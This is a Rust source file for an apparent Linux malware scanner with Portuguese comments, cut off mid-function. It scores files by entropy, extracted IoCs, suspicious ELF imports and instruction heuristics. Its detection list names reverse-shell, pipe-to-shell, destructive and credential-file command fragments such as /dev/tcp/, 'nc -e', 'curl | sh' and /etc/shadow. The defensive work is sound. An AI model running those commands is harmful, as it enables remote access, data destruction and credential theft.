use chrono::{DateTime, Local};
use goblin::elf::Elf;
use iced_x86::{Decoder, DecoderOptions, Formatter, Instruction, Mnemonic, NasmFormatter};
use regex::bytes::Regex as RegexBytes;
use regex::Regex;
use serde::Serialize;
use std::io::Read;
use std::net::Ipv6Addr;
use std::path::Path;
use std::str::FromStr;
use std::sync::OnceLock;

/// Limite de leitura ao analisar um arquivo. Arquivos maiores são amostrados
/// apenas no prefixo — protege o daemon contra OOM em ISOs/containers grandes.
pub const TAMANHO_MAXIMO_LEITURA: u64 = 100 * 1024 * 1024; // 100 MiB

static REGEX_IPV4: OnceLock<Regex> = OnceLock::new();

fn regex_ipv4() -> &'static Regex {
    REGEX_IPV4.get_or_init(|| {
        Regex::new(
            r"(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)",
        )
        .unwrap()
    })
}

// ─────────────────────────────────────────────────────────────────────────────
// Tipos públicos
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum TipoIoC {
    Ipv4,
    Ipv6,
    Url,
    CarteiraBtc,
    CarteiraXmr,
    CarteiraEth,
    ComandoSuspeito,
}

impl TipoIoC {
    pub fn rotulo(&self) -> &'static str {
        match self {
            TipoIoC::Ipv4 => "IPv4",
            TipoIoC::Ipv6 => "IPv6",
            TipoIoC::Url => "URL",
            TipoIoC::CarteiraBtc => "BTC",
            TipoIoC::CarteiraXmr => "XMR",
            TipoIoC::CarteiraEth => "ETH",
            TipoIoC::ComandoSuspeito => "CMD",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize)]
pub struct IoC {
    pub tipo: TipoIoC,
    pub valor: String,
}

impl IoC {
    fn novo(tipo: TipoIoC, valor: impl Into<String>) -> Self {
        IoC { tipo, valor: valor.into() }
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct InstrucaoSuspeita {
    pub endereco: u64,
    pub mnemonico: String,
    pub operandos: String,
    pub motivo: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum CategoriaImport {
    AntiDebug,
    ResolucaoDinamica,
    SpawnProcesso,
    AbusoMemoria,
}

impl CategoriaImport {
    pub fn rotulo(&self) -> &'static str {
        match self {
            CategoriaImport::AntiDebug => "anti-debug",
            CategoriaImport::ResolucaoDinamica => "resolução dinâmica",
            CategoriaImport::SpawnProcesso => "spawn de processo",
            CategoriaImport::AbusoMemoria => "abuso de memória",
        }
    }

    fn peso(&self) -> f64 {
        match self {
            CategoriaImport::AntiDebug => 1.5,
            CategoriaImport::ResolucaoDinamica => 1.0,
            CategoriaImport::SpawnProcesso => 0.3,
            CategoriaImport::AbusoMemoria => 0.5,
        }
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct ImportSuspeito {
    pub nome: String,
    pub categoria: CategoriaImport,
}

#[derive(Debug, Clone, Serialize)]
pub struct SecaoAnomala {
    pub nome: String,
    pub entropia: f64,
    pub tamanho: u64,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum NivelAmeaca {
    Limpo,
    Baixo,
    Medio,
    Alto,
    Critico,
}

impl NivelAmeaca {
    pub fn nome(&self) -> &str {
        match self {
            NivelAmeaca::Limpo => "LIMPO",
            NivelAmeaca::Baixo => "BAIXO",
            NivelAmeaca::Medio => "MEDIO",
            NivelAmeaca::Alto => "ALTO",
            NivelAmeaca::Critico => "CRITICO",
        }
    }

    pub fn valor(&self) -> u8 {
        match self {
            NivelAmeaca::Limpo => 0,
            NivelAmeaca::Baixo => 1,
            NivelAmeaca::Medio => 2,
            NivelAmeaca::Alto => 3,
            NivelAmeaca::Critico => 4,
        }
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct ResultadoAnalise {
    pub caminho: std::path::PathBuf,
    pub timestamp: DateTime<Local>,
    pub entropia: f64,
    pub tem_permissao_exec: bool,
    pub veio_da_internet: bool,
    pub iocs: Vec<IoC>,
    pub instrucoes_suspeitas: Vec<InstrucaoSuspeita>,
    pub imports_suspeitos: Vec<ImportSuspeito>,
    pub secoes_anomalas: Vec<SecaoAnomala>,
    pub eh_elf: bool,
    pub nivel_ameaca: NivelAmeaca,
    pub pontuacao: f64,
    /// true quando o arquivo é um container comprimido (ZIP/APK/JAR/GZip…);
    /// a entropia alta é esperada nesses formatos e não conta como indicador.
    pub formato_comprimido: bool,
    /// Tamanho real do arquivo em bytes (antes de qualquer truncamento).
    pub tamanho_arquivo: u64,
    /// true quando o arquivo excedeu [`TAMANHO_MAXIMO_LEITURA`] e foi amostrado
    /// apenas no prefixo. Entropia e IoCs são calculados sobre a amostra.
    pub arquivo_truncado: bool,
}

// ─────────────────────────────────────────────────────────────────────────────
// Ponto de entrada da análise
// ─────────────────────────────────────────────────────────────────────────────

pub fn analisar_arquivo(caminho: &Path) -> Result<ResultadoAnalise, Box<dyn std::error::Error>> {
    let metadata = std::fs::metadata(caminho)?;
    let tamanho_arquivo = metadata.len();
    let (dados, arquivo_truncado) = ler_com_limite(caminho, tamanho_arquivo)?;
    let timestamp = Local::now();

    let entropia = calcular_entropia(&dados);
    let formato_comprimido = eh_formato_comprimido(&dados);
    let tem_permissao_exec = verificar_permissao_exec(caminho);
    let veio_da_internet = verificar_origem_internet(caminho);
    let iocs = varrer_iocs(&dados);

    let eh_elf = dados.len() >= 4 && dados[..4] == *b"\x7fELF";
    let (instrucoes_suspeitas, imports_suspeitos, secoes_anomalas) = if eh_elf {
        analisar_elf(&dados)
    } else {
        (vec![], vec![], vec![])
    };

    let (pontuacao, nivel_ameaca) = calcular_nivel_ameaca(
        entropia,
        &iocs,
        &instrucoes_suspeitas,
        &imports_suspeitos,
        &secoes_anomalas,
        tem_permissao_exec,
        veio_da_internet,
        formato_comprimido,
    );

    Ok(ResultadoAnalise {
        caminho: caminho.to_path_buf(),
        timestamp,
        entropia,
        tem_permissao_exec,
        veio_da_internet,
        iocs,
        instrucoes_suspeitas,
        imports_suspeitos,
        secoes_anomalas,
        eh_elf,
        nivel_ameaca,
        pontuacao,
        formato_comprimido,
        tamanho_arquivo,
        arquivo_truncado,
    })
}

/// Lê o arquivo até [`TAMANHO_MAXIMO_LEITURA`] bytes. Retorna o buffer e um
/// flag indicando se o arquivo foi truncado.
fn ler_com_limite(
    caminho: &Path,
    tamanho_arquivo: u64,
) -> Result<(Vec<u8>, bool), Box<dyn std::error::Error>> {
    if tamanho_arquivo <= TAMANHO_MAXIMO_LEITURA {
        return Ok((std::fs::read(caminho)?, false));
    }
    let mut arquivo = std::fs::File::open(caminho)?;
    let mut buffer = Vec::with_capacity(TAMANHO_MAXIMO_LEITURA as usize);
    arquivo
        .by_ref()
        .take(TAMANHO_MAXIMO_LEITURA)
        .read_to_end(&mut buffer)?;
    Ok((buffer, true))
}

// ─────────────────────────────────────────────────────────────────────────────
// Entropia de Shannon
// ─────────────────────────────────────────────────────────────────────────────

pub fn calcular_entropia(dados: &[u8]) -> f64 {
    if dados.is_empty() {
        return 0.0;
    }
    let mut freq = [0u64; 256];
    for &byte in dados {
        freq[byte as usize] += 1;
    }
    let len = dados.len() as f64;
    freq.iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / len;
            -p * p.log2()
        })
        .sum()
}

// ─────────────────────────────────────────────────────────────────────────────
// Detecção de container comprimido por magic bytes
// ─────────────────────────────────────────────────────────────────────────────

pub fn eh_formato_comprimido(dados: &[u8]) -> bool {
    match dados {
        // ZIP / APK / JAR / DOCX / XLSX / ODF (todos são ZIP internamente)
        [0x50, 0x4B, 0x03, 0x04, ..] | [0x50, 0x4B, 0x05, 0x06, ..] => true,
        // GZip
        [0x1F, 0x8B, ..] => true,
        // Bzip2
        [b'B', b'Z', b'h', ..] => true,
        // XZ
        [0xFD, b'7', b'z', b'X', b'Z', ..] => true,
        // 7-Zip
        [b'7', b'z', 0xBC, 0xAF, ..] => true,
        // RAR 4.x e 5.x
        [b'R', b'a', b'r', b'!', 0x1A, 0x07, ..] => true,
        // Zstandard
        [0x28, 0xB5, 0x2F, 0xFD, ..] => true,
        // LZ4
        [0x02, 0x21, 0x4C, 0x18, ..] => true,
        _ => false,
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Verificações de permissão e origem
// ─────────────────────────────────────────────────────────────────────────────

fn verificar_permissao_exec(caminho: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(caminho)
        .map(|m| m.permissions().mode() & 0o111 != 0)
        .unwrap_or(false)
}

fn verificar_origem_internet(caminho: &Path) -> bool {
    // Chromium, Firefox e gerenciadores de download definem esses xattrs.
    let attrs = [
        "user.xdg.origin.url",
        "user.download.URL",
        "user.xdg.referrer.url",
    ];
    attrs
        .iter()
        .any(|attr| xattr::get(caminho, attr).ok().flatten().is_some())
}

// ─────────────────────────────────────────────────────────────────────────────
// Varredura de IoCs — IPs, URLs, carteiras crypto e comandos suspeitos
// ─────────────────────────────────────────────────────────────────────────────

static REGEX_IPV6: OnceLock<Regex> = OnceLock::new();
static REGEX_URL: OnceLock<RegexBytes> = OnceLock::new();
static REGEX_BTC_LEGADO: OnceLock<Regex> = OnceLock::new();
static REGEX_BTC_BECH32: OnceLock<Regex> = OnceLock::new();
static REGEX_XMR: OnceLock<Regex> = OnceLock::new();
static REGEX_ETH: OnceLock<Regex> = OnceLock::new();

fn regex_ipv6() -> &'static Regex {
    REGEX_IPV6.get_or_init(|| {
        // Match permissivo que aceita contração "::". Exige no mínimo 3
        // separadores ':' para reduzir ruído de tokens curtos tipo "abc::DFA"
        // (identificadores C++/Rust) e "5::" (valores hex em strings).
        Regex::new(r"[0-9a-fA-F]{1,4}(?::[0-9a-fA-F]{0,4}){3,7}").unwrap()
    })
}

fn regex_url() -> &'static RegexBytes {
    REGEX_URL.get_or_init(|| {
        // Limitado a 200 chars para evitar capturar concatenações longas que
        // misturam URLs de doc com texto adjacente em .rodata.
        RegexBytes::new(r#"https?://[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%\-]{4,200}"#).unwrap()
    })
}

fn regex_btc_legado() -> &'static Regex {
    REGEX_BTC_LEGADO
        .get_or_init(|| Regex::new(r"\b[13][A-HJ-NP-Za-km-z1-9]{25,34}\b").unwrap())
}

fn regex_btc_bech32() -> &'static Regex {
    REGEX_BTC_BECH32.get_or_init(|| Regex::new(r"\bbc1[ac-hj-np-z02-9]{11,71}\b").unwrap())
}

fn regex_xmr() -> &'static Regex {
    REGEX_XMR.get_or_init(|| Regex::new(r"\b[48][1-9A-HJ-NP-Za-km-z]{94}\b").unwrap())
}

fn regex_eth() -> &'static Regex {
    REGEX_ETH.get_or_init(|| Regex::new(r"\b0x[a-fA-F0-9]{40}\b").unwrap())
}

/// Padrões de comando suspeitos armazenados em fragmentos para evitar
/// auto-detecção: o binário do Obscura analisaria a si mesmo como malicioso
/// se as strings completas aparecessem em `.rodata`. Concatenadas em runtime.
const PADROES_COMANDO_FRAGMENTADOS: &[&[&str]] = &[
    &["/dev", "/tcp/"],
    &["/dev", "/udp/"],
    &["bash", " -i"],
    &["sh", " -i"],
    &["nc ", "-e"],
    &["ncat ", "-e"],
    &["curl ", "| sh"],
    &["wget ", "| sh"],
    &["| ", "bash"],
    &["chmod ", "+x"],
    &["rm ", "-rf /"],
    &["/etc/", "shadow"],
    &["/root", "/.ssh"],
    &["history ", "-c"],
    &["unset ", "HISTFILE"],
];

static PADROES_COMANDO: OnceLock<Vec<String>> = OnceLock::new();

fn padroes_comando_suspeito() -> &'static [String] {
    PADROES_COMANDO.get_or_init(|| {
        PADROES_COMANDO_FRAGMENTADOS
            .iter()
            .map(|partes| partes.concat())
            .collect()
    })
}

pub fn varrer_iocs(dados: &[u8]) -> Vec<IoC> {
    let texto = String::from_utf8_lossy(dados);
    let texto_bytes = texto.as_bytes();
    let mut iocs: Vec<IoC> = Vec::new();

    iocs.extend(varrer_ipv4(&texto, texto_bytes));
    iocs.extend(varrer_ipv6(&texto, texto_bytes));
    iocs.extend(varrer_urls(dados));
    iocs.extend(varrer_carteiras_crypto(&texto));
    iocs.extend(varrer_comandos_suspeitos(&texto));

    iocs.sort();
    iocs.dedup();
    iocs
}

fn varrer_ipv4(texto: &str, texto_bytes: &[u8]) -> Vec<IoC> {
    let re = regex_ipv4();
    let mut out = Vec::new();
    for m in re.find_iter(texto) {
        let ip = m.as_str();
        if ip_privado(ip) {
            continue;
        }
        // Filtro de contexto: se precedido por [-@a-zA-Z_] ou seguido por [-a-zA-Z_]
        // o match é parte de uma string de versão (ex: "pkg-1.24.0.38-linux").
        let byte_antes = m.start().checked_sub(1).and_then(|i| texto_bytes.get(i).copied());
        let byte_depois = texto_bytes.get(m.end()).copied();
        let contexto_versao = matches!(byte_antes,
                Some(b) if b.is_ascii_alphabetic() || b == b'-' || b == b'@' || b == b'_')
            || matches!(byte_depois,
                Some(b) if b.is_ascii_alphabetic() || b == b'-' || b == b'_')
            || matches!(byte_depois, Some(b) if b.is_ascii_digit());
        if !contexto_versao {
            out.push(IoC::novo(TipoIoC::Ipv4, ip));
        }
    }
    out
}

fn varrer_ipv6(texto: &str, texto_bytes: &[u8]) -> Vec<IoC> {
    let re = regex_ipv6();
    let mut out = Vec::new();
    for m in re.find_iter(texto) {
        let candidato = m.as_str();
        // Validação estrita via parser do stdlib.
        let Ok(addr) = Ipv6Addr::from_str(candidato) else { continue };
        if ipv6_privado_ou_reservado(&addr) {
            continue;
        }
        // Evita capturar parte de identificadores maiores (símbolos C++, hashes).
        let byte_antes = m.start().checked_sub(1).and_then(|i| texto_bytes.get(i).copied());
        let byte_depois = texto_bytes.get(m.end()).copied();
        let ruido = matches!(byte_antes, Some(b) if b.is_ascii_alphanumeric() || b == b'_')
            || matches!(byte_depois, Some(b) if b.is_ascii_alphanumeric() || b == b'_');
        if !ruido {
            out.push(IoC::novo(TipoIoC::Ipv6, candidato));
        }
    }
    out
}

fn varrer_urls(dados: &[u8]) -> Vec<IoC> {
    // Roda sobre bytes para não depender de UTF-8 válido.
    regex_url()
        .find_iter(dados)
        .filter_map(|m| std::str::from_utf8(m.as_bytes()).ok())
        .filter(|url| !url_eh_ruidosa(url))
        .map(|url| IoC::novo(TipoIoC::Url, url.trim_end_matches(&['.', ',', ')', '"', '\''][..])))
        .collect()
}

fn url_eh_ruidosa(url: &str) -> bool {
    // URLs que aparecem rotineiramente em dependências/runtime de aplicações
    // legítimas (specs, namespaces XML, docs de OSS, repositórios de crates).
    const HOSTS_IGNORADOS: &[&str] = &[
        "://www.w3.org/",
        "://schemas.microsoft.com/",
        "://schemas.xmlsoap.org/",
        "://schemas.android.com/",
        "://docs.oasis-open.org/",
        "://xmlns.jcp.org/",
        "://json-schema.org/",
        "://localhost",
        "://127.",
        "://0.0.0.0",
        // Open source dev hosts — comuns em strings embutidas de crates Rust/Go
        "://github.com/",
        "://gitlab.com/",
        "://docs.rs/",
        "://crates.io/",
        "://pkg.go.dev/",
        "://golang.org/",
        // Freedesktop / D-Bus / FreeType / GTK aparecem em notify-rust, dbus etc.
        "://www.freedesktop.org/",
        "://dbus.freedesktop.org/",
        "://specifications.freedesktop.org/",
        // Strings de licença GNU/coreutils/i18n estão em quase todo utilitário.
        "://www.gnu.org/",
        "://gnu.org/",
        "://translationproject.org/",
        "://www.xiph.org/",
        "://wiki.xiph.org/",
        "://www.gnupg.org/",
        // Documentação de toolchains e libs C++
        "://gcc.gnu.org/",
        "://sourceware.org/",
        "://www.unicode.org/",
        "://unicode.org/",
        "://www.iso.org/",
        // IANA / IETF — referências em libs de rede
        "://www.iana.org/",
        "://www.ietf.org/",
        "://tools.ietf.org/",
    ];
    // Sufixos de schema (DTDs, XSDs) também são ruído.
    if url.ends_with(".dtd") || url.ends_with(".xsd") || url.ends_with(".xml") {
        return true;
    }
    HOSTS_IGNORADOS.iter().any(|h| url.contains(h))
}

fn varrer_carteiras_crypto(texto: &str) -> Vec<IoC> {
    let mut out = Vec::new();
    for m in regex_btc_legado().find_iter(texto) {
        out.push(IoC::novo(TipoIoC::CarteiraBtc, m.as_str()));
    }
    for m in regex_btc_bech32().find_iter(texto) {
        out.push(IoC::novo(TipoIoC::CarteiraBtc, m.as_str()));
    }
    for m in regex_xmr().find_iter(texto) {
        out.push(IoC::novo(TipoIoC::CarteiraXmr, m.as_str()));
    }
    for m in regex_eth().find_iter(texto) {
        let addr = m.as_str();
        // 0x000...0 e endereços com baixa entropia hex são quase certamente
        // ruído (constantes, strings de teste). Heurística simples: exigir
        // pelo menos 6 caracteres hex únicos.
        let nibbles: std::collections::HashSet<u8> = addr[2..].bytes().collect();
        if nibbles.len() >= 6 {
            out.push(IoC::novo(TipoIoC::CarteiraEth, addr));
        }
    }
    out
}

fn varrer_comandos_suspeitos(texto: &str) -> Vec<IoC> {
    padroes_comando_suspeito()
        .iter()
        .filter(|padrao| texto.contains(padrao.as_str()))
        .map(|padrao| IoC::novo(TipoIoC::ComandoSuspeito, padrao.as_str()))
        .collect()
}

fn ipv6_privado_ou_reservado(addr: &Ipv6Addr) -> bool {
    addr.is_loopback()
        || addr.is_unspecified()
        || addr.is_multicast()
        // link-local fe80::/10
        || (addr.segments()[0] & 0xffc0) == 0xfe80
        // unique-local fc00::/7
        || (addr.segments()[0] & 0xfe00) == 0xfc00
        // discard prefix 100::/64
        || addr.segments()[0] == 0x0100
}

fn ip_privado(ip: &str) -> bool {
    // Octetos com zero à esquerda (ex: "13.24.04.15") não são IPv4 canônicos —
    // algumas libs interpretam como octal; aqui descartamos como ruído.
    for oct in ip.split('.') {
        if oct.len() > 1 && oct.starts_with('0') {
            return true;
        }
    }

    // RFC 1918 / reservados
    if ip == "0.0.0.0"
        || ip.starts_with("0.")    // 0.0.0.0/8 — "this network", reservado
        || ip == "127.0.0.1"
        || ip == "255.255.255.255"
        || ip.starts_with("192.168.")
        || ip.starts_with("10.")
        || ip.starts_with("172.16.")
        || ip.starts_with("172.17.")
        || ip.starts_with("172.18.")
        || ip.starts_with("172.19.")
        || ip.starts_with("172.20.")
        || ip.starts_with("172.21.")
        || ip.starts_with("172.22.")
        || ip.starts_with("172.23.")
        || ip.starts_with("172.24.")
        || ip.starts_with("172.25.")
        || ip.starts_with("172.26.")
        || ip.starts_with("172.27.")
        || ip.starts_with("172.28.")
        || ip.starts_with("172.29.")
        || ip.starts_with("172.30.")
        || ip.starts_with("172.31.")
        || ip.starts_with("169.254.")
        || ip.starts_with("224.")
        || ip.starts_with("240.")
    {
        return true;
    }

    // OIDs ASN.1 / X.509 — parecem IPs mas são identificadores de padrão.
    // Prefixo "1.3.6." = internet, "2.5." = X.500/X.509, "2.16." = country codes.
    if ip.starts_with("1.3.6.")
        || ip.starts_with("2.5.")
        || ip.starts_with("2.16.")
        || ip.starts_with("1.2.840.")
        || ip.starts_with("0.9.")
    {
        return true;
    }

    // Octeto inicial com zero à esquerda (ex: "045.x.x.x") — inválido como IP real
    if ip.starts_with('0') && ip.len() > 1 && ip.as_bytes().get(1) != Some(&b'.') {
        return true;
    }

    false
}

// ─────────────────────────────────────────────────────────────────────────────
// Análise ELF: disassembly + heurísticas
// ─────────────────────────────────────────────────────────────────────────────

fn analisar_elf(
    dados: &[u8],
) -> (Vec<InstrucaoSuspeita>, Vec<ImportSuspeito>, Vec<SecaoAnomala>) {
    let Ok(elf) = Elf::parse(dados) else {
        return (vec![], vec![], vec![]);
    };
    let imports = inspecionar_imports(&elf);
    let secoes_anomalas = varrer_secoes_anomalas(dados, &elf);
    let instrucoes = match extrair_secao_text(dados, &elf) {
        Ok((base, texto)) => analisar_instrucoes(base, texto),
        Err(_) => vec![],
    };
    (instrucoes, imports, secoes_anomalas)
}

/// Detecta seções ELF com nome não-padrão e entropia > 7.0 — indicador clássico
/// de packers (UPX, custom crypters) que escondem payload em seções customizadas.
fn varrer_secoes_anomalas(dados: &[u8], elf: &Elf) -> Vec<SecaoAnomala> {
    const TAMANHO_MINIMO_SECAO: u64 = 256; // ignora seções pequenas (ruidosas)
    const LIMIAR_ENTROPIA: f64 = 7.0;
    const SHT_NOBITS: u32 = 8;

    let mut out: Vec<SecaoAnomala> = Vec::new();
    for secao in &elf.section_headers {
        // Seções sem conteúdo no arquivo (BSS) não têm bytes para medir.
        if secao.sh_type == SHT_NOBITS || secao.sh_size < TAMANHO_MINIMO_SECAO {
            continue;
        }
        let nome = elf.shdr_strtab.get_at(secao.sh_name).unwrap_or("");
        if nome.is_empty() || secao_eh_padrao(nome) {
            continue;
        }
        let inicio = secao.sh_offset as usize;
        let fim = inicio.saturating_add(secao.sh_size as usize);
        if fim > dados.len() {
            continue;
        }
        let ent = calcular_entropia(&dados[inicio..fim]);
        if ent >= LIMIAR_ENTROPIA {
            out.push(SecaoAnomala {
                nome: nome.to_string(),
                entropia: ent,
                tamanho: secao.sh_size,
            });
        }
    }
    out
}

/// Conjunto de seções padrão emitidas por toolchains GCC/Clang/LLVM/Go/Rust.
/// Seções fora desta lista com alta entropia são suspeitas (packer/crypter).
fn secao_eh_padrao(nome: &str) -> bool {
    // Prefixos comuns que cobrem famílias inteiras (.debug_*, .rela.*, etc.)
    const PREFIXOS: &[&str] = &[
        ".debug_",
        ".rela.",
        ".rel.",
        ".gnu.",
        ".note.",
        ".eh_",
        ".gcc_",
    ];
    if PREFIXOS.iter().any(|p| nome.starts_with(p)) {
        return true;
    }
    const PADRAO: &[&str] = &[
        ".text", ".data", ".rodata", ".bss", ".init", ".fini",
        ".init_array", ".fini_array", ".plt", ".plt.got", ".plt.sec",
        ".got", ".got.plt", ".tbss", ".tdata",
        ".symtab", ".strtab", ".shstrtab",
        ".dynsym", ".dynstr", ".dynamic", ".interp", ".hash",
        ".comment", ".ident",
        ".ARM.exidx", ".ARM.extab", // cross-arch tolerância
        // Rust/Go específicos
        ".llvm.lto", ".llvm_addrsig", ".llvm_stackmaps",
        ".gosymtab", ".gopclntab", ".typelink", ".itablink",
        ".go.buildinfo", ".noptrdata", ".noptrbss",
    ];
    PADRAO.contains(&nome)
}

fn inspecionar_imports(elf: &Elf) -> Vec<ImportSuspeito> {
    let mut vistos = std::collections::HashSet::new();
    let mut out: Vec<ImportSuspeito> = Vec::new();
    for sym in elf.dynsyms.iter() {
        // Imports são símbolos não-definidos (SHN_UNDEF == 0).
        if sym.st_shndx != 0 {
            continue;
        }
        let Some(nome) = elf.dynstrtab.get_at(sym.st_name) else { continue };
        if !vistos.insert(nome.to_string()) {
            continue;
        }
        if let Some(categoria) = classificar_import(nome) {
            out.push(ImportSuspeito {
                nome: nome.to_string(),
                categoria,
            });
        }
    }
    out.sort_by(|a, b| a.nome.cmp(&b.nome));
    out
}

/// Categoriza um símbolo importado por papel típico em malware.
/// Aceita sufixos de versão GLIBC (ex: `execve@GLIBC_2.2.5`).
fn classificar_import(nome: &str) -> Option<CategoriaImport> {
    let base = nome.split('@').next().unwrap_or(nome);
    Some(match base {
        "ptrace" | "process_vm_readv" | "process_vm_writev" => CategoriaImport::AntiDebug,
        // prctl pode ser uso legítimo, mas em downloads é mais suspeito que neutro
        "prctl" => CategoriaImport::AntiDebug,
        "dlsym" | "dlopen" | "dlmopen" | "dl_iterate_phdr" => {
            CategoriaImport::ResolucaoDinamica
        }
        "execve" | "execv" | "execvp" | "execvpe" | "execl" | "execlp" | "execle"
        | "fexecve" | "system" | "popen" | "posix_spawn" | "posix_spawnp" => {
            CategoriaImport::SpawnProcesso
        }
        "mprotect" | "pkey_mprotect" | "memfd_create" => CategoriaImport::AbusoMemoria,
        _ => return None,
    })
}

fn extrair_secao_text<'a>(
    dados: &'a [u8],
    elf: &Elf,
) -> Result<(u64, &'a [u8]), Box<dyn std::error::Error>> {
    for secao in &elf.section_headers {
        let nome = elf.shdr_strtab.get_at(secao.sh_name).unwrap_or("");
        if nome == ".text" {
            let inicio = secao.sh_offset as usize;
            let fim = inicio + secao.sh_size as usize;
            if fim > dados.len() {
                return Err(format!(
                    "Seção .text excede os limites do arquivo (offset: {}, tamanho: {})",
                    inicio,
                    secao.sh_size
                )
                .into());
            }
            return Ok((secao.sh_addr, &dados[inicio..fim]));
        }
    }
    Err("Seção .text não encontrada no binário ELF.".into())
}

/// Limiar de bytes consecutivos de NOP single-byte para considerar sled de exploit.
const LIMIAR_NOP_SLED: u32 = 16;

fn analisar_instrucoes(endereco_base: u64, bytes_texto: &[u8]) -> Vec<InstrucaoSuspeita> {
    let mut decodificador =
        Decoder::with_ip(64, bytes_texto, endereco_base, DecoderOptions::NONE);
    let mut formatador = NasmFormatter::new();
    let mut instrucao = Instruction::default();
    let mut suspeitas: Vec<InstrucaoSuspeita> = Vec::new();
    let mut buffer = String::new();

    // Estado para correlações entre instruções consecutivas.
    let mut nop_streak: u32 = 0;
    let mut nop_streak_inicio: u64 = 0;
    let mut ultimo_mov_rax_imm: Option<u64> = None;

    while decodificador.can_decode() {
        decodificador.decode_out(&mut instrucao);
        let mnemonic = instrucao.mnemonic();

        // ── Sled de NOPs single-byte (0x90 repetido) ──────────────────────
        // Compiladores modernos usam NOPs multi-byte para alinhamento;
        // sequências longas de 0x90 single-byte são padrão de shellcode.
        if mnemonic == Mnemonic::Nop && instrucao.len() == 1 {
            if nop_streak == 0 {
                nop_streak_inicio = instrucao.ip();
            }
            nop_streak += 1;
        } else {
            if nop_streak >= LIMIAR_NOP_SLED {
                suspeitas.push(InstrucaoSuspeita {
                    endereco: nop_streak_inicio,
                    mnemonico: "nop".into(),
                    operandos: format!("× {nop_streak} bytes"),
                    motivo:
                        "Sled de NOP single-byte — padrão clássico de cushion para shellcode"
                            .into(),
                });
            }
            nop_streak = 0;
        }

        // Captura "mov rax, imm" para correlacionar com a próxima syscall.
        let mov_rax_imm_atual = extrair_mov_rax_imediato(&instrucao);

        // ── Heurística 1: SYSCALL direta ──────────────────────────────────
        if mnemonic == Mnemonic::Syscall {
            let motivo = match ultimo_mov_rax_imm.and_then(nome_syscall_x86_64) {
                Some(nome) => format!(
                    "Syscall direta ao kernel ({nome}) — bypass libc / shellcode"
                ),
                None => "Syscall direta ao kernel — padrão de shellcode/bypass libc".into(),
            };
            suspeitas.push(InstrucaoSuspeita {
                endereco: instrucao.ip(),
                mnemonico: "syscall".into(),
                operandos: String::new(),
                motivo,
            });
        }

        // ── Heurística 2: XOR reg, reg (zeragem) ──────────────────────────
        if mnemonic == Mnemonic::Xor && instrucao.op_count() == 2 {
            let op0 = instrucao.op0_register();
            let op1 = instrucao.op1_register();
            if op0 == op1 && op0 != iced_x86::Register::None && eh_registrador_64bits(op0) {
                buffer.clear();
                formatador.format(&instrucao, &mut buffer);
                let operandos = buffer
                    .split_once(' ')
                    .map(|(_, rest)| rest)
                    .unwrap_or("")
                    .to_string();
                suspeitas.push(InstrucaoSuspeita {
                    endereco: instrucao.ip(),
                    mnemonico: "xor".into(),
                    operandos,
                    motivo: "XOR reg,reg — zeragem de registrador (ofuscação/evasão)".into(),
                });
            }
        }

        // ── Heurística 3: RDTSC — anti-debug / timing checks ─────────────
        if mnemonic == Mnemonic::Rdtsc || mnemonic == Mnemonic::Rdtscp {
            suspeitas.push(InstrucaoSuspeita {
                endereco: instrucao.ip(),
                mnemonico: "rdtsc".into(),
                operandos: String::new(),
                motivo: "RDTSC — leitura de timestamp counter (timing checks / anti-debug)"
                    .into(),
            });
        }

        // ── Heurística 4: instruções de virtualização em user-space ──────
        // VMCALL/VMLAUNCH/CPUID com EAX manipulado são padrões anti-VM
        // clássicos. VMCALL fora de hypervisor é altamente suspeito.
        if matches!(
            mnemonic,
            Mnemonic::Vmcall | Mnemonic::Vmlaunch | Mnemonic::Vmread | Mnemonic::Vmwrite
        ) {
            suspeitas.push(InstrucaoSuspeita {
                endereco: instrucao.ip(),
                mnemonico: format!("{:?}", mnemonic).to_lowercase(),
                operandos: String::new(),
                motivo: "Instrução VMX em user-space — anti-VM ou tentativa de escape"
                    .into(),
            });
        }

        ultimo_mov_rax_imm = mov_rax_imm_atual;
    }

    // Fechamento: NOP streak ao final do .text.
    if nop_streak >= LIMIAR_NOP_SLED {
        suspeitas.push(InstrucaoSuspeita {
            endereco: nop_streak_inicio,
            mnemonico: "nop".into(),
            operandos: format!("× {nop_streak} bytes"),
            motivo:
                "Sled de NOP single-byte — padrão clássico de cushion para shellcode".into(),
        });
    }

    suspeitas
}

/// Extrai o imediato quando a instrução é `mov rax, <imm>` (ou alias).
/// Usado para identificar o número da syscall que será invocada em seguida.
fn extrair_mov_rax_imediato(instrucao: &Instruction) -> Option<u64> {
    use iced_x86::{OpKind, Register};
    if instrucao.mnemonic() != Mnemonic::Mov || instrucao.op_count() != 2 {
        return None;
    }
    // Cobrir RAX / EAX / AX / AL — todos zeram a parte alta em modo long
    // quando alvo é a forma 32-bit, e o valor imediato fica disponível.
    let destino = instrucao.op0_register();
    let cobre_rax = matches!(destino, Register::RAX | Register::EAX | Register::AX | Register::AL);
    if !cobre_rax {
        return None;
    }
    match instrucao.op1_kind() {
        OpKind::Immediate8
        | OpKind::Immediate8to16
        | OpKind::Immediate8to32
        | OpKind::Immediate8to64
        | OpKind::Immediate16
        | OpKind::Immediate32
        | OpKind::Immediate32to64
        | OpKind::Immediate64 => Some(instrucao.immediate(1)),
        _ => None,
    }
}

/// Nomes amigáveis para syscalls Linux x86_64 que merecem destaque em alertas.
/// Lista enxuta — apenas as relevantes para detecção de shellcode/intrusão.
fn nome_syscall_x86_64(numero: u64) -> Option<&'static str> {
    Some(match numero {
        0 => "read",
        1 => "write",
        2 => "open",
        3 => "close",
        9 => "mmap",
        10 => "mprotect",
